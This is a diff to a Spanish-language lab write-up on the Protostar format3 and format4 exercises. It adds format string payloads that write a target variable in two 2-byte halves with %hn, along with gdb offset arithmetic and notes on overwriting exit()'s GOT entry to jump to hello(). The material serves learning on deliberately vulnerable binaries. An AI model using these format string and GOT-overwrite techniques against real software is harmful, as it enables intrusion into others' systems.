@@ -225,11 +225,45 @@ $1 = 16930112
 [user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08" + "%16930112x%12$n")' | ./format3 | tail -n1
 you have modified the target :)
 ```
+Extra -> en vez de escribir los 4 bytes, escribimos de 2 en 2
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08\xf6\x96\x04\x08" + "%12$hn" + "%13$hn")' | ./format3 ;echo 
+�� target is 00080008 :(
+```
+Aui hemos puesto dos dierecciones de memoria, la primera es la de la varaible target (la misma que con 4 bytes) y la segunda es la misma pero sumando 2-> 0x080496f4 y 0x080496f6) Es decir, dos memorias para escribir 2 bytes en cada una (mitad del valor la varaible para una mitad para la otra en vez de todo para una como antes). Como ya tenemos dos argumentos en vez de uno pues %12 y %13. Y en h es para lo de escribir dos bytes.
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ gdb
+(gdb) p 0x0102 - 0x0008
+$1 = 250
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08\xf6\x96\x04\x08" + "%250x%12$hn" + "%13$hn")' | ./format3 ;echo 
+target is 01020102 :(
+```
+El primer byte son 0102 y el segundo tambiennos ha escrito eso, pero tiene que ser "01025544" asi que nos falta un poco para llegar, veamos cuanto:
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ gdb
+(gdb) p 0x5544 - 0x0102 
+$1 = 21570
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08\xf6\x96\x04\x08" + "%250x%12$hn" + "%21570x%13$hn")' | ./format3 | tail -n1
+target is 55440102 :(
+```
+Vaya, resulta ser que nos ha salido al reves, asi que cuando trabajemos con dos bytes hay que poner o las memorias al reves o los argumentos al reves.
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08\xf6\x96\x04\x08" + "%250x%13$hn" + "%21570x%12$hn")' | ./format3 | tail -n1
+you have modified the target :)
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf6\x96\x04\x08\xf4\x96\x04\x08" + "%250x%12$hn" + "%21570x%13$hn")' | ./format3 | tail -n1
+you have modified the target :)
+
+```
+
 
 ---------------------------------------------------------------------------
 # Sobreescribir la GOT para saltar a una funcion que nos interese-> [format4](https://exploit.education/protostar/format-four/)
 
-Este binario al ejecutarlo se parece mucho a format2, pero no nos sale nada mas. Tambien, hay la vuln de format string. 
+Este binario al ejecutarlo se parece mucho a format2, pero no nos sale nada mas. Tambien, hay la vuln de format string.
 
 ```console
 [user@protostar]-[/opt/protostar/bin]:$ user@protostar:/opt/protostar/bin$ ./format4 AAA
@@ -245,6 +279,13 @@ AAAA
 user@protostar:/opt/protostar/bin$ python -c 'print("%8x."*5)' | ./format4
 200.b7fd8420.bffff524.2e783825.2e783825.
 ```
+
+El buffer son 512 bytes, y este ejercicio esta pensado para la vuln de "cadenas de formateo" nada de buffer overflows, Es por eso que no salta ningun segfault si le metemos mas bytes de la cuenta por que los descarta.
+
+```console
+python -c 'print("A" * 560)' | ./format4; echo
+```
+
 Solo que hay una función llamada "hello"
 
 ```console
@@ -253,6 +294,9 @@ Solo que hay una función llamada "hello"
 80484b4:	55
 ```
 Abrimos el programa con gdb y le echamos un vistazo.
+Adelanto que aquí entra en juego el concepto de la [GOT](https://github.com/CUCUxii/CUCUxii.github.io/blob/main/binarios/Estructura%20de%20un%20binario.md) Tenemos que poner la direccion de la función "hello()" en la tabla GOT (por tanto el programa vera que hay algo ahi y no llamará al loader, este no buscará la direccion buena de exit())
+
+Cuando se examina un binario sin haber hecho ningun breakpoint (o sea no esta en ejecucion) nos sale las entradas de la GOT, (no la llamada a ld.so)
 
 ```console
 [user@protostar]-[/opt/protostar/bin]:$ gdb ./format4 
@@ -262,13 +306,13 @@ Instrucciones de main entre ellas, saltar a vuln()
 0x0804851a <main+6>:	call   0x80484d2 <vuln>
 (gdb) disas vuln
 ...
-0x0804850f <vuln+61>:	call   0x80483ec <exit@plt>
-(gdb) x/i 0x80483ec
-0x80483ec <exit@plt>:	jmp    DWORD PTR ds:0x8049724
+0x0804850f <vuln+61>:	call   0x80483ec <exit@plt> -> Entrada en la tabla plt de exit()
+(gdb) x/i 0x80483ec       -> Nos interesa ver la primera inturccion de plt (la que tiene relacion con la GOT, no las del ld.so)
+0x80483ec <exit@plt>:	jmp    DWORD PTR ds:0x8049724 -> Llamada a la GOT de exit()
 (gdb) x 0x8049724
-0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	repnz add DWORD PTR [eax+ecx*1],0x0
+0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	repnz add DWORD PTR [eax+ecx*1],0x0 -> Código de exit()
 ```
-Yatenemos todas las direcciones que nos interesan, la de la funcion hello() y la de la llamada a GOT original (printf). Hau que sustituirla por la
+Yatenemos todas las direcciones que nos interesan, la de la funcion hello() y la de la llamada a GOT original (printf). Hay que sustituirla por la
 de hello(). En gdb es muy fácil
 
 ```console
